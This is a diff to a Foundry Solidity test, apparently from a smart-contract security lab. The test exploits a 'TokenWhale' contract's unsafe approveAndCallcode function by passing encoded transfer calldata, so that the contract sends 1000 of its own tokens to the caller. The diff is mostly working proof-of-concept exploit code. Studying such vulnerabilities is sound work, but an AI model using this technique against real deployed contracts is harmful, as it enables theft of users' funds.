@@ -34,33 +34,19 @@ contract ContractTest is Test {
             "TokenWhale balance:",
             TokenWhaleContract.balanceOf(address(TokenWhaleContract))
         );
-
-        // bytes memory payload = abi.encodeWithSignature("transfer(address,uint256)",address(alice),1000);
-
-        console.log(
-            "Alice tries to perform unsafe call to transfer asset from TokenWhaleContract"
+        bytes memory _extraData = abi.encodeWithSelector(
+            TokenWhaleContract.transfer.selector,
+            address(this),
+            1000
         );
-        vm.prank(alice);
         TokenWhaleContract.approveAndCallcode(
             address(TokenWhaleContract),
-            0x1337, // doesn't affect the exploit
-            abi.encodeWithSignature(
-                "transfer(address,uint256)",
-                address(alice),
-                1000
-            )
+            1,
+            _extraData
         );
-
-        // check if the exploit is successful
-        assertEq(TokenWhaleContract.balanceOf(address(alice)), 1000);
-        console.log("Exploit completed");
         console.log(
             "TokenWhale balance:",
             TokenWhaleContract.balanceOf(address(TokenWhaleContract))
-        );
-        console.log(
-            "Alice balance:",
-            TokenWhaleContract.balanceOf(address(alice))
         );
     }
 
